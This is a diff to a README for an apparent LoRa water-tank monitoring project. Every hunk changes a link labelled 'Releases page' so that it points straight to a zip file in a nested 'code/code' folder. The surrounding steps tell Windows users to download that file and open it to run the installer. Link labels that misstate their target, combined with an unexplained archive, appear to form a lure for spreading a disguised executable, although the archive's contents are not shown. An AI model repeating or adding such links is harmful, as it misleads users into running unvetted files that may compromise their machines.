@@ -1,6 +1,6 @@
 # ⚡ Wireless-water-tank-monitoring-lora - Monitor water levels with ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/main/code/code/tank_water_Wireless_monitoring_lora_1.3.zip)
 
 ## 🚀 What this does
 
@@ -12,7 +12,7 @@ This setup is built for simple monitoring and control. It is useful when the tan
 
 Visit this page to download the latest release for Windows:
 
-[Open the Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+[Open the Releases page](https://raw.githubusercontent.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/main/code/code/tank_water_Wireless_monitoring_lora_1.3.zip)
 
 On that page, look for the latest release and download the Windows file that matches it. After the file downloads, open it to run the app or installer.
 
@@ -30,7 +30,7 @@ If your system blocks the file, check the download folder and open the file from
 
 ## 🧭 How to install
 
-1. Open the [Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/main/code/code/tank_water_Wireless_monitoring_lora_1.3.zip)
 2. Find the newest release at the top
 3. Download the Windows file from the release assets
 4. Wait for the download to finish
@@ -172,7 +172,7 @@ This project is built for clear water tank status and simple remote control. It 
 
 ## 📞 Need the download again?
 
-[Open the Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+[Open the Releases page](https://raw.githubusercontent.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/main/code/code/tank_water_Wireless_monitoring_lora_1.3.zip)
 
 ## 🧰 Good to know
 
